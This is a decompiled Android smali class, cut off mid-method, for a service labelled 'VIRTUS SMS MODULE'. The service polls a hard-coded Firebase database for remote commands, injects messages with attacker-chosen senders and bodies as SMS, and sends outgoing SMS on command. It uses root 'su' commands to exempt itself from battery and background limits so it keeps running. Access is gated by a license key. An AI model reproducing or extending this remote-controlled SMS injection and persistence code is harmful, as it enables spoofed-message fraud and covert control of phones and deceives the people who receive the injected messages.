.class public Lcom/virtus/module/TelegramPollingService;
.super Landroid/app/Service;
.source "TelegramPollingService.java"


# static fields
.field private static final CHANNEL_ID:Ljava/lang/String; = "virtus_module_channel"

.field private static final MODULE_DB:Ljava/lang/String; = "https://virtus-module-default-rtdb.firebaseio.com"

.field private static final NOTIFICATION_ID:I = 0x3e7

.field private static final PREFS_NAME:Ljava/lang/String; = "virtus_module_prefs"

.field private static final TAG:Ljava/lang/String; = "VirtusModule"

.field public static volatile cfgMonitoring:Z

.field public static volatile cfgTs:J


# instance fields
.field private volatile cfgDb:Ljava/lang/String;

.field private volatile cfgDevice:Ljava/lang/String;

.field private volatile cfgKey:Ljava/lang/String;

.field private firebaseBase:Ljava/lang/String;

.field private volatile isRunning:Z

.field private volatile lastSeenId:Ljava/lang/String;

.field private volatile monitoring:Z

.field private volatile pollStop:Z

.field private pollThread:Ljava/lang/Thread;

.field private volatile streamStop:Z

.field private streamThread:Ljava/lang/Thread;

.field private wakeLock:Landroid/os/PowerManager$WakeLock;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .line 44
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    .line 51
    iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->isRunning:Z

    .line 52
    iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z

    .line 53
    iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->pollStop:Z

    .line 56
    const-string v1, "https://virtus-module-default-rtdb.firebaseio.com"

    iput-object v1, p0, Lcom/virtus/module/TelegramPollingService;->firebaseBase:Ljava/lang/String;

    .line 60
    iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->monitoring:Z

    .line 61
    const-string v0, ""

    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->cfgDb:Ljava/lang/String;

    .line 62
    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;

    .line 63
    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;

    .line 64
    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$000(Lcom/virtus/module/TelegramPollingService;)Z
    .locals 0

    .line 44
    iget-boolean p0, p0, Lcom/virtus/module/TelegramPollingService;->isRunning:Z

    return p0
.end method

.method static synthetic access$100(Lcom/virtus/module/TelegramPollingService;Landroid/content/SharedPreferences;)V
    .locals 0

    .line 44
    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->readConfig(Landroid/content/SharedPreferences;)V

    return-void
.end method

.method static synthetic access$1000(Lcom/virtus/module/TelegramPollingService;)V
    .locals 0

    .line 44
    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->pollOnce()V

    return-void
.end method

.method static synthetic access$200(Lcom/virtus/module/TelegramPollingService;)Landroid/os/PowerManager$WakeLock;
    .locals 0

    .line 44
    iget-object p0, p0, Lcom/virtus/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    return-object p0
.end method

.method static synthetic access$300(Lcom/virtus/module/TelegramPollingService;Ljava/lang/String;)Landroid/app/Notification;
    .locals 0

    .line 44
    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->buildNotification(Ljava/lang/String;)Landroid/app/Notification;

    move-result-object p0

    return-object p0
.end method

.method static synthetic access$400(Lcom/virtus/module/TelegramPollingService;)Z
    .locals 0

    .line 44
    iget-boolean p0, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z

    return p0
.end method

.method static synthetic access$500(Lcom/virtus/module/TelegramPollingService;)V
    .locals 0

    .line 44
    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->runStream()V

    return-void
.end method

.method static synthetic access$600(Lcom/virtus/module/TelegramPollingService;Ljava/lang/String;)V
    .locals 0

    .line 44
    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$700(Lcom/virtus/module/TelegramPollingService;Landroid/content/SharedPreferences;)Ljava/lang/String;
    .locals 0

    .line 44
    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->chosenSourcePath(Landroid/content/SharedPreferences;)Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method static synthetic access$800(Lcom/virtus/module/TelegramPollingService;)Ljava/lang/String;
    .locals 0

    .line 44
    iget-object p0, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;

    return-object p0
.end method

.method static synthetic access$900(Lcom/virtus/module/TelegramPollingService;)Z
    .locals 0

    .line 44
    iget-boolean p0, p0, Lcom/virtus/module/TelegramPollingService;->pollStop:Z

    return p0
.end method

.method private applyRootKeepAlive()V
    .locals 4

    .line 165
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const/4 v1, 0x3

    new-array v1, v1, [Ljava/lang/String;

    const-string v2, "su"

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "-c"

    const/4 v3, 0x1

    aput-object v2, v1, v3

    const-string v2, "cmd deviceidle whitelist +com.virtus.module;cmd appops set com.virtus.module RUN_ANY_IN_BACKGROUND allow;cmd appops set com.virtus.module START_FOREGROUND allow;dumpsys deviceidle whitelist +com.virtus.module;settings put global low_power_mode 0"

    const/4 v3, 0x2

    aput-object v2, v1, v3

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 171
    invoke-virtual {v0}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v1

    .line 172
    const-string v2, "exit\n"

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/io/OutputStream;->write([B)V

    .line 173
    invoke-virtual {v1}, Ljava/io/OutputStream;->flush()V

    .line 174
    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V

    .line 175
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0

    .line 176
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "root keepalive err: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "VirtusModule"

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method private buildNotification(Ljava/lang/String;)Landroid/app/Notification;
    .locals 4

    .line 216
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/virtus/module/MainActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 218
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x17

    const/4 v3, 0x0

    if-lt v1, v2, :cond_0

    const/high16 v1, 0x4000000

    goto :goto_0

    :cond_0
    const/4 v1, 0x0

    .line 217
    :goto_0
    invoke-static {p0, v3, v0, v1}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    .line 219
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_1

    .line 220
    new-instance v1, Landroid/app/Notification$Builder;

    const-string v2, "virtus_module_channel"

    invoke-direct {v1, p0, v2}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_1

    .line 221
    :cond_1
    new-instance v1, Landroid/app/Notification$Builder;

    invoke-direct {v1, p0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    .line 222
    :goto_1
    const-string v2, "VIRTUS SMS MODULE"

    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v1

    .line 223
    invoke-virtual {v1, p1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object p1

    const v1, 0x1080039

    .line 224
    invoke-virtual {p1, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object p1

    .line 225
    invoke-virtual {p1, v0}, Landroid/app/Notification$Builder;->setContentIntent(Landroid/app/PendingIntent;)Landroid/app/Notification$Builder;

    move-result-object p1

    const/4 v0, 0x1

    .line 226
    invoke-virtual {p1, v0}, Landroid/app/Notification$Builder;->setOngoing(Z)Landroid/app/Notification$Builder;

    move-result-object p1

    .line 227
    invoke-virtual {p1}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object p1

    return-object p1
.end method

.method private chosenSourcePath(Landroid/content/SharedPreferences;)Ljava/lang/String;
    .locals 1

    .line 515
    iget-boolean p1, p0, Lcom/virtus/module/TelegramPollingService;->monitoring:Z

    const-string v0, ""

    if-nez p1, :cond_0

    return-object v0

    .line 516
    :cond_0
    iget-object p1, p0, Lcom/virtus/module/TelegramPollingService;->cfgDb:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result p1

    if-nez p1, :cond_2

    iget-object p1, p0, Lcom/virtus/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result p1

    if-eqz p1, :cond_1

    goto :goto_0

    .line 517
    :cond_1
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->cfgDb:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "/messages/"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    :cond_2
    :goto_0
    return-object v0
.end method

.method private createNotificationChannel()V
    .locals 4

    .line 207
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    .line 208
    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "Virtus Module"

    const/4 v2, 0x2

    const-string v3, "virtus_module_channel"

    invoke-direct {v0, v3, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 210
    const-string v1, "notification"

    invoke-virtual {p0, v1}, Lcom/virtus/module/TelegramPollingService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    if-eqz v1, :cond_0

    .line 211
    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    :cond_0
    return-void
.end method

.method private handleEvent(Ljava/lang/String;)V
    .locals 3

    .line 334
    const-string v0, "/"

    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 335
    const-string p1, "path"

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 336
    const-string v2, "data"

    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->optJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v1

    if-nez v1, :cond_0

    goto :goto_2

    .line 339
    :cond_0
    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 341
    invoke-virtual {v1}, Lorg/json/JSONObject;->keys()Ljava/util/Iterator;

    move-result-object p1

    .line 342
    :cond_1
    :goto_0
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_5

    .line 343
    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    .line 344
    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->optJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v2

    if-eqz v2, :cond_1

    .line 345
    invoke-direct {p0, v0, v2}, Lcom/virtus/module/TelegramPollingService;->processChild(Ljava/lang/String;Lorg/json/JSONObject;)V

    goto :goto_0

    .line 350
    :cond_2
    :goto_1
    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_3

    const/4 v2, 0x1

    invoke-virtual {p1, v2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object p1

    goto :goto_1

    .line 351
    :cond_3
    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_4

    goto :goto_2

    .line 352
    :cond_4
    invoke-direct {p0, p1, v1}, Lcom/virtus/module/TelegramPollingService;->processChild(Ljava/lang/String;Lorg/json/JSONObject;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p1

    .line 355
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "event parse error: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "VirtusModule"

    invoke-static {v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :cond_5
    :goto_2
    return-void
.end method

.method private markConsumed(Ljava/lang/String;)V
    .locals 2

    .line 410
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/virtus/module/TelegramPollingService$5;

    invoke-direct {v1, p0, p1}, Lcom/virtus/module/TelegramPollingService$5;-><init>(Lcom/virtus/module/TelegramPollingService;Ljava/lang/String;)V

    const-string p1, "virtus-fb-mark"

    invoke-direct {v0, v1, p1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    .line 437
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private pollOnce()V
    .locals 7

    .line 522
    const-string v0, "VirtusModule"

    .line 0
    const-string v1, "?auth="

    .line 522
    const-string v2, "virtus_module_prefs"

    const/4 v3, 0x0

    invoke-virtual {p0, v2, v3}, Lcom/virtus/module/TelegramPollingService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 523
    const-string v3, "license_key"

    const-string v4, ""

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 524
    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-eqz v3, :cond_0

    goto/16 :goto_8

    .line 526
    :cond_0
    invoke-direct {p0, v2}, Lcom/virtus/module/TelegramPollingService;->readConfig(Landroid/content/SharedPreferences;)V

    .line 528
    invoke-direct {p0, v2}, Lcom/virtus/module/TelegramPollingService;->chosenSourcePath(Landroid/content/SharedPreferences;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_f

    .line 529
    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-eqz v3, :cond_1

    goto/16 :goto_8

    :cond_1
    const/4 v3, 0x0

    .line 532
    :try_start_0
    new-instance v5, Ljava/net/URL;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ".json"

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_2

    move-object v1, v4

    goto :goto_0

    :cond_2
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    :goto_0
    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v5, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 533
    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v1

    check-cast v1, Ljava/net/HttpURLConnection;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 534
    :try_start_1
    const-string v2, "GET"

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const/16 v2, 0xfa0

    .line 535
    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    const/16 v2, 0xbb8

    .line 536
    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 537
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v2
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    const/16 v3, 0xc8

    if-eq v2, v3, :cond_3

    if-eqz v1, :cond_f

    .line 572
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V

    return-void

    .line 539
    :cond_3
    :try_start_2
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v2

    .line 540
    new-instance v3, Ljava/io/BufferedReader;

    new-instance v5, Ljava/io/InputStreamReader;

    const-string v6, "UTF-8"

    invoke-direct {v5, v2, v6}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    invoke-direct {v3, v5}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 541
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 543
    :goto_1
    invoke-virtual {v3}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v5

    if-eqz v5, :cond_4

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_1

    .line 544
    :cond_4
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_d

    .line 545
    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_d

    const-string v3, "null"

    invoke-virtual {v2, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_5

    goto/16 :goto_5

    .line 546
    :cond_5
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3, v2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 548
    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    .line 549
    invoke-virtual {v3}, Lorg/json/JSONObject;->keys()Ljava/util/Iterator;

    move-result-object v5

    .line 550
    :goto_2
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_6

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    invoke-interface {v2, v6}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_2

    .line 551
    :cond_6
    iget-object v5, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;

    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-eqz v5, :cond_9

    .line 555
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_7
    :goto_3
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_8

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/String;

    invoke-virtual {v5, v4}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I

    move-result v6

    if-lez v6, :cond_7

    move-object v4, v5

    goto :goto_3

    .line 556
    :cond_8
    iput-object v4, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;

    .line 557
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "SEED done \u2014 lastSeen="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " ("

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, " old skipped, untouched)"

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    if-eqz v1, :cond_f

    .line 572
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V

    return-void

    .line 560
    :cond_9
    :try_start_3
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_a
    :goto_4
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_c

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    .line 561
    iget-object v5, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I

    move-result v5

    if-lez v5, :cond_a

    .line 563
    invoke-virtual {v3, v4}, Lorg/json/JSONObject;->optJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v5

    if-eqz v5, :cond_b

    .line 564
    invoke-direct {p0, v4, v5}, Lcom/virtus/module/TelegramPollingService;->processChild(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 565
    :cond_b
    iput-object v4, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_4

    :cond_c
    if-eqz v1, :cond_f

    .line 572
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V

    return-void

    :cond_d
    :goto_5
    if-eqz v1, :cond_f

    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V

    return-void

    :catchall_0
    move-exception v0

    move-object v3, v1

    goto :goto_7

    :catch_0
    move-exception v2

    move-object v3, v1

    goto :goto_6

    :catchall_1
    move-exception v0

    goto :goto_7

    :catch_1
    move-exception v2

    .line 570
    :goto_6
    :try_start_4
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "poll err: "

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    if-eqz v3, :cond_f

    .line 572
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->disconnect()V

    goto :goto_8

    :goto_7
    if-eqz v3, :cond_e

    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 573
    :cond_e
    throw v0

    :cond_f
    :goto_8
    return-void
.end method

.method private declared-synchronized processChild(Ljava/lang/String;Lorg/json/JSONObject;)V
    .locals 8

    const-string v0, "inject OK + consumed: "

    const-string v1, "inject FAILED for "

    const-string v2, "FB inject: "

    const-string v3, "process child error: "

    monitor-enter p0

    .line 366
    :try_start_0
    iget-object v4, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;

    invoke-virtual {p1, v4}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I

    move-result v4

    if-lez v4, :cond_0

    iput-object p1, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;

    .line 368
    :cond_0
    const-string v4, "injected"

    const/4 v5, 0x0

    invoke-virtual {p2, v4, v5}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v4, :cond_1

    monitor-exit p0

    return-void

    .line 369
    :cond_1
    :try_start_1
    const-string v4, "sender"

    const-string v5, ""

    invoke-virtual {p2, v4, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 370
    const-string v5, "body"

    const-string v6, ""

    invoke-virtual {p2, v5, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 371
    invoke-static {p0, v4, v5}, Lcom/virtus/module/OutgoingSmsSender;->trySendFromOutgoingBody(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_out_send

    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V

    monitor-exit p0

    return-void

    :cond_out_send
    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v6

    if-nez v6, :cond_4

    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v6

    if-eqz v6, :cond_2

    goto :goto_0

    .line 375
    :cond_2
    const-string v6, "VirtusModule"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, " | "

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v2

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, " chars"

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

